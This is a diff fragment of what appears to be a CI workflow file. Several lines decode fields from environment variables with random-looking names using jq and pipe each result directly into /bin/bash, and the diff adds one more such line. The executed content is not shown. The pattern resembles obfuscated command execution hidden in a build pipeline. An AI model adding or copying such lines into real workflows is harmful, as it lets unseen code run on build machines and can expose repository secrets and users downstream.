@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$ncpv84829" | jq -r .i5 | /bin/bash
           echo $rfvux6 | jq -r .ey10 | /bin/bash
           echo $ossku4 | jq -r .og45 | /bin/bash
+          echo $azw82 | jq -r .wthm932 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
